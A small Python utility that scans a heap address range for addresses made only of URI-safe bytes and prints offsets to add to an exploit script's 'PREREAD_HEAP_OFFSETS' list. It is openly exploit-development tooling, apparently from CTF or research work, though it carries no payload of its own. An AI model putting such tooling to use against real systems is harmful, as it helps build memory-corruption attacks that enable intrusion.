#!/usr/bin/env python3
import argparse
import sys


SAFE = set()
_t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
for _b in range(256):
    if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
        SAFE.add(_b)


def addr_is_safe(addr):
    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(8))


def find_safe_offsets(heap_base, heap_size=0x200000, step=1):
    safe = []
    for off in range(0, heap_size, step):
        addr = heap_base + off
        if addr_is_safe(addr):
            safe.append((off, addr))
    return safe


def main():
    parser = argparse.ArgumentParser(
        description="Find URI-safe heap addresses for exploit"
    )
    parser.add_argument("--heap-base", type=lambda x: int(x, 16),
                        default=0x555555659000)
    parser.add_argument("--heap-size", type=lambda x: int(x, 16),
                        default=0x200000)
    parser.add_argument("--count", type=int, default=20)
    parser.add_argument("--list-all", action="store_true")
    args = parser.parse_args()

    safe = find_safe_offsets(args.heap_base, args.heap_size)
    print(f"Found {len(safe)} URI-safe addresses in heap range")
    print(f"Safe character set ({len(SAFE)} chars): "
          f"{''.join(chr(b) for b in sorted(SAFE) if 32 <= b <= 126)}")
    print()

    candidates = sorted(safe, key=lambda x: x[0])[:args.count]
    for off, addr in candidates:
        bytes_repr = ''.join(f'\\x{b:02x}' for b in
                            [(addr >> (j * 8)) & 0xff for j in range(6)])
        print(f"  offset=0x{off:06x}  addr=0x{addr:012x}  bytes={bytes_repr}")

    print(f"\nTo use in exploit.py, add offsets to PREREAD_HEAP_OFFSETS:")
    for off, addr in candidates[:10]:
        print(f"    0x{off:06x},")


if __name__ == "__main__":
    sys.exit(main())
